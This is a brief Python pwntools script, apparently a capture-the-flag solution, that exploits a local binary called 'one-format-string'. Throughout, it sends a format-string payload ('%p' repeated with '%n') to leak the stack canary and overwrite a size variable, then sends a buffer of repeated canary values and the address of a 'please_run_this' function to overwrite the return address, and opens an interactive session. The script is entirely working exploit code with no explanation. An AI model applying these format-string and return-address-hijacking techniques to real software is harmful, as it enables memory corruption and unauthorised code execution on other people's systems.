from pwn import *

env = {'PATH' : '.:/bin:/usr/bin'}

# Launch processs
p = process('./one-format-string', env=env)
pem = ELF('./one-format-string').symbols['please_run_this']

# Read the cookie and overwrite the size variable at the same time
print(p.recvline())
print(("%p"*23) + "%500x%13$n")
p.sendline(("%p"*23) + "%500x%13$n")

# Parse out the cookie
data = p.recvline()
cookie = int(data.split('0x')[19][0:16], 16)
print("Cookie: " + hex(cookie))

# Pass the cookie and overwrite the return address
print(p.recvline())
print(p64(cookie)*10 + p64(pem) * 10)
p.sendline(p64(cookie)*10 + p64(pem) * 10)
p.interactive()
